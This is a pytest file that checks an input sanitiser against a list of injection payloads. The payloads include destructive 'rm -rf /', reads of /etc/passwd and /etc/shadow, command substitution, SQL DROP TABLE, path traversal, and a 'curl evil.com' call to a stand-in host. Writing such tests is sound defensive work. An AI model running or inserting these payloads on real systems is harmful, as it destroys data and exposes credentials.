"""Tests for input sanitisation against injection attempts."""

from __future__ import annotations

import pytest

from shared.errors.exceptions import SanitisationError
from shared.sanitisation.input_sanitiser import InputSanitiser


@pytest.fixture
def sanitiser():
    return InputSanitiser()


# Injection attempt corpus
INJECTION_PAYLOADS = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "repo; DROP TABLE users;",
    "../../../etc/passwd",
    "repo\x00--malicious",
    "repo\nwhoami",
    "$(cat /etc/shadow)",
    "repo && curl evil.com",
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_injection_payloads_rejected(sanitiser, payload):
    """Shell injection payloads should be rejected or stripped."""
    # The sanitiser should either reject or strip dangerous characters
    try:
        result = sanitiser.validate(payload)
        # If it passes, dangerous characters must be removed
        assert ";" not in result
        assert "|" not in result
        assert "$" not in result
        assert "`" not in result
    except SanitisationError:
        pass  # Rejection is also acceptable


def test_valid_repo_path_accepted(sanitiser):
    """Valid repository paths should be accepted."""
    assert sanitiser.validate_repo_path("jol-platform") == "jol-platform"
    assert sanitiser.validate_repo_path("org/repo-name") == "org/repo-name"
    assert sanitiser.validate_repo_path("my_repo") == "my_repo"


def test_invalid_repo_path_rejected(sanitiser):
    """Invalid repository paths should be rejected."""
    with pytest.raises(SanitisationError):
        sanitiser.validate_repo_path("../../../etc/passwd")
    with pytest.raises(SanitisationError):
        sanitiser.validate_repo_path("repo; rm -rf /")
